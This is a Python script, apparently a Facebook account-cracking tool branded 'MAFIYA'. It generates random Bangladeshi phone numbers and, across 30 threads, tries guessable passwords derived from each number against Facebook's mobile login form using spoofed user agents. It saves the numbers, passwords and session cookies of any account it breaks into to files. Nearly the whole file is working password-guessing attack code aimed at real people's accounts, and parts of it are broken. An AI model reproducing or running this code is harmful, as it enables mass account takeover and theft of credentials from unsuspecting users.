import uuid
import os,time
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
os.system(f" clear")                          
print('\033[1;32m [+]\033[1;37m TOOL UPDATING !! ')
time.sleep(1.5)
print('\033[1;32m [+]\033[1;37m WAIT FOR UPDATE !! ')
time.sleep(1.5)
os.system('git pull')
time.sleep(1)
os.system('clear')
print('\033[1;32m [+]\033[1;37m UPDATE DONE \033[1;32m\033[1;37m MAFIYA IS A BRAND NOT A NAME')
time.sleep(2)
user=[]
ok=[]
cp=[]
loop=0
redmi=[]
ugen=[]
def tst():
    END = '[FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Google;FBMF/Linux;FBBD/linux;FBDV/F1;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1280};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; linux Build/TP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def tst():
    END = '[FBAN/FB4A;FBAV/256.0.0.17.157;FBBV/298672900;FBPN/com.facebook.katana;FBLC/en_US;FBCR/zncl;FBMF/vivo;FBBD/vivo;FBDV/vivo;FBSV/9;FBOP/1;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=718,height=1492};]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; vivo Build/TP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
def cek_apk():
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f' %s{P}[%s❌%s] %sSorry There is No Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f' [🎮] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f' %s[%s❌%s] %sSorry There is No Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f' [✔] %s ☑ Your Expired Apps ☑    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print("%s═════════════════════%s═════════════════════%s"%(M,H,P))
def menu():
    clear()
    print(' [1] RANDOM UID CRACK')
    print(' [2] Contact Tool Admin')
    print(' [0] EXIT')
    print(45*'\033[1;31m═\033[1;37m')
    opt=input(' Choose an option : ')
    if opt in '1':
    	v1()
    if opt in '2':
    	os.system("your id Link ")
    else:
    	exit()
logo = ("""
  __  __          ______ _______     __      
 |  \/  |   /\   |  ____|_   _\ \   / //\    
 | \  / |  /  \  | |__    | |  \ \_/ //  \   
 | |\/| | / /\ \ |  __|   | |   \   // /\ \  
 | |  | |/ ____ \| |     _| |_   | |/ ____ \ 
 |_|  |_/_/    \_\_|    |_____|  |_/_/    \_\
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: SAHADAT CHOWDHURY 
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94m MAFIYA
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;95mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;95mPREMIUM
\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.0.0
\033[1;96m═════════════════════════════════════════════ """)

def linex():
	print(45*'\033[1;31m═\033[1;37m')
def clear():
    os.system('clear')
    print(logo)
def v1():
    clear()
    bal = input("\n [+] MAFIYA => ")
    clear()
    print(' [+] SIM CODE BD=> 016•017•018•019')
    linex()
    code = input('\n\033[1;32m [\033[1;32m?\033[1;32m] SIM CODE : ')
    clear()
    print(' [+] 2000•5000•10000•15000•50000')
    linex()
    limit = int(input('\n [?] ENTER YOUR CRACK LIMIT : '))
    for x in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as tanisha:
        clear()
        total=str(len(user))
        print('\033[1;96m [+] \033[1;33m YOUR NAME : \033[1;32m'+bal );print('\033[1;96m [+] \033[1;33m YOUR COUNTRY CODE :\033[1;32m '+code);print(f'\033[1;96m [+] \033[1;33m TOTAL IDz: \033[1;32m''\n\033[1;96m [+] \033[1;33m \033[1;33mMETHOD : \033[1;32mM1\033[1;37m');print(f"\033[1;96m [+] \033[1;33m\033[1;36m USE FLIGHT MODE FOR MORE SPEED\033[1;37m");print(45*'\033[1;31m═\033[1;37m')
        for akash in user:
            uid=code+akash
            ak=uid[:7]
            st=uid[0:7]
            lm=uid[:6]
            hs=uid[0:6]
            pss=[uid,akash,ak,st,lm,hs,'bangladesh']
            tanisha.submit(htx_cracker,uid,pss)
    print('\n\033[1;37m-------------------------------------------------')
    print(f' TOTAL OK/CP : {str(len(ok))}/{str(len(cp))}')
    linex()
def htx_cracker(uid,pss):
    global ok
    global loop
    try:
        for ps in pss:
            session=requests.Session()
            sys.stdout.write(f'\r \033[1;34m[MAFIYA]\033[1;93m[{tl}]\033[1;97m[{loop}]\033[1;92m[OK-{len(ok)}]\r')
            sys.stdout.flush()
            ua=tst()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            pron_star={
            'authority': 'm.facebook.com',
            'method':'GET',
            'scheme':'https',
            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://m.alpha.facebook.com',
            'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="108"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f' \033[38;5;46m[TURAG-OK] {idf} | {ps}\n\033[1;37m=[🐻‍\033[1;37m]= \033[38;5;46m{coki}')
                open('/sdcard/TURAG-OK.txt','a').write(idf+'|'+ps+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                print(f' \033[1;31m[TURAG-CP] {idf} | {ps}')
                open('/sdcard/TURAG-CP','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
        loop+=1
    except:
        pass
menu()
